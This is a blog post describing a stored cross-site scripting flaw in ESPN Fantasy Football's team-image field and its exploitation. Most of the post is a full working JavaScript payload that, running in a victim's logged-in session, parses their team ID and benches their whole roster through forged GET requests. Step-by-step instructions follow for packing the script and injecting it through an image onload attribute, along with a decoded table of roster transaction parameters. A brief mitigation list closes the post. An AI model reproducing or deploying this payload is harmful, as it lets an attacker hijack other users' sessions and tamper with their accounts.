title: ESPN Fantasy Football - The Complete Attack
publish: True
categories: [hacking]

I have run an ESPN Fantasy Football League every year since the software was available and am a huge fan of the ESPN Fantasy Football experience. However, last year I came across a series of vulnerabilities in the FFB software which basically give an attacker full control of opponent, and other league, teams. Very few people know of the research I was conducting as I was beginning the disclosure process with ESPN.com's web developers. Today, to my complete surprise, I was made aware of these 2 articles:

<!-- READMORE -->

[http://www.theregister.co.uk/2010/09/22/espn_fantasy_football_cheating/](http://www.theregister.co.uk/2010/09/22/espn_fantasy_football_cheating/)  
[http://xs-sniper.com/blog/2010/09/22/put-me-in-coach/comment-page-1/](http://xs-sniper.com/blog/2010/09/22/put-me-in-coach/comment-page-1/)

While xssniper rightfully gets the credit for the discovery, as he was quicker to the trigger than I, he missed something in his research which greatly enhances this attack. There is a stored XSS vulnerability in the team image setting which allows an attacker to store a malicious script on the server and completely automates the roster attacks for anyone that is subjected to the team image. ESPN does validate the input by removing '&lt;' and '&gt;' from the input, but what it doesn't do is limit the length of the input. Therefore, you can write the script in its entirety and inject it into the input field. The code that I have developed as a POC also works across leagues. Come back soon as I will be posting screenshots and POC code when I can get back to my lab.

ENJOY!

UPDATE: Note to self, take screenshots prior to disclosure of vulnerabilities. In my own defense, I was caught completely off guard by the disclosure so...

![Oops!](/images/posts/oops.png)

Since i'm limited in the amount of pictures I can show at this point, i'll do my best to explain the process.

### Discovery:

It all started at DEFCON 17. I had spent the majority of my time in the Web App Security track and really enjoyed the concepts of web application testing. As we all know, DEFCON is in late July / early August which was also about the time I typically set up my FFB league for the year. As I was editing my team settings, I saw that you could set a custom image in the form of a url. Since the image is then shown back to you on every page you visit within the league from that point forward, I figured there was some serious potential for a stored XSS attack there. Looking at the code, I noticed that all it did was take the url you submit, and throw it into the 'src' attribute of an image tag. In my first attempt to exploit, i filled the image tag with arbitrary data and appended a script tag to the closed image tag. To ESPN's credit, they actually validated the input and filtered out all '&lt;' and '&gt;'. Therefore, the script tag didn't work. I'd have to exploit via the image tag. Very easy. There are several events in an image that allows you to run javascript, 'onerror' and 'onload'. As you can see from my demo last year, I initially went with the 'onerror' event because I wanted to be completely obvious in testing. ESPN did not validate and filter out any javascript code, so the exploitation worked perfectly. For practical implementation, I went with the 'onload' event, loading an actual team image, and running the script upon a successful load. I had some fun with this over the season.

### Exploitation:

My favorite implementation was a script that prompted other players viewing my team if they were my opponent that week. If they clicked 'yes', then the script went through a series or random "trash talking" phrases. If they clicked 'no', then they were forward to my team page. Harmless really. As I began to look more into the FFB software, I began to notice the same parameter issues that xssniper pointed out in his blog. So a few months ago, I wrote a script which uses the stored XSS vulnerability to parse all of the required parameters from the visiting players browser and executes any series of evil things based upon those params. The code below first determines whether the visiting player is logged in or not. If they are logged in, it parses out the 'teamId', makes an AJAX call for their team page, parses out all of the 'playerId's, then loops through and benches every player using a dummy javascript image request. Basically, on gameday, when my opponent launches the scoreboard, their entire team is benched and they are unable to score any points. XSS FTW... literally!!!

``` javascript
function unique(a) {
  var r = new Array();
  o:for(var i = 0, n = a.length; i &lt; n; i++) {
    for(var x = 0, y = r.length; x &lt; y; x++) {
      if(r[x]==a[i]) {
        continue o;
      }
    }
    r[r.length] = a[i];
  }
  return r;
}
var pagesrc = document.documentElement.innerHTML;
var score_period;
var league_id;
var team_id;
var team_url;
var bench_url;
var player_ids = null;
var patt_pid = /(playerId=).([\d]+).\s/g;
var patt_tid = /([\d]+)/g;
var patt_spid = /currentScoringPeriodId:\s(\d+),/g;
var patt_lid = /leagueId:\s(\d+),/g;
if (pagesrc.search("My Fantasy Teams")!=-1) {
  //get currentScoringPeriodId
  score_period = patt_spid.exec(pagesrc);
  score_period = score_period[1];
  //get leagueId
  league_id = patt_lid.exec(pagesrc);
  league_id = league_id[1];
  //get teamId
  pagesrc = pagesrc.substr(pagesrc.indexOf("My Fantasy Teams"),400);
  team_id = pagesrc.substr(pagesrc.indexOf("teamId=")+7);
  team_id = patt_tid.exec(team_id);
  team_id = team_id[1];
  team_url = "http://games.espn.go.com/ffl/clubhouse?leagueId=" + league_id + "&amp;teamId=" + team_id + "&amp;seasonId=2010";
  var xmlhttp = new XMLHttpRequest();
  xmlhttp.open("GET", team_url, true);
  xmlhttp.onreadystatechange = function() {
    if (xmlhttp.readyState == 4) {
      pagesrc = xmlhttp.responseText;
      player_ids_clean = new Array();
      var i = 0;
      while (player_ids = patt_pid.exec(pagesrc)) {
        player_ids_clean[i] = player_ids[2];
        i += 1;
      }
      player_ids_clean = unique(player_ids_clean);
      for (i=0;i&lt;=15;i++) {
        bench_url = "http://games.espn.go.com/ffl/pnc/saveRoster?leagueId=" + league_id + "&amp;teamId=" + team_id + "&amp;scoringPeriodId=" + score_period + "&amp;returnSm=false&amp;trans=1_" + player_ids_clean[i] + "_0_20";
        img = new Image();
        img.src = bench_url;
      }
    }
  };
  xmlhttp.send(null);
}
```

Script usage:

1. Compress with [http://dean.edwards.name/packer/](http://dean.edwards.name/packer/)
2. Copy compressed code and paste into notepad
3. Use notpad to replace all " with '
4. Append result from notepad to `http://[image url]" onload="`

The script is seen as coming from espn, so same origin policy applies and the script is allowed to run. Also, NoScript doesn't help unless you are blocking globally which ruins the espn.com experience.

Other information I was able to discover:

transType table:

```
1=Move
2=Add
3=Drop
```

Position table:

```
0=QB
1=Not on Roster
2=RB1/2
3=RB/WR
4=WR1/2
5=TE
16=D
17=K
20=BENCH
```

ADD Player:

```
transType_playerId_?_?_startPos?_endPos
ex. 2_11390_-1_1001_1_20
```

MOVE Player:

```
transType_playerId_startPos_endPos
ex. 1_1753_0_20
```

DROP Player:

```
transType_playerId_teamId/scoringPeriod?_Position_?_?
ex. 3_1753_1_2_-1_1002
```

Bottom-line Findings and Mitigation:

1. Input box allows strings of any length for input. Bad idea. Limit input.
2. When done for real, there is a confirmation button which issues a POST. However, the server side function will accept a GET, which makes this attack much easier. If they accepted POST only, then we would have to use additional resources to create the attack. Much easier to leverage a session through GET than it is to pass authentication tokens via POST.
3. Some code validation is done, but not enough. May prevent referencing the script from another location, but since it is injectible through 'onerror' and 'onload', and input is unlimited, who cares.
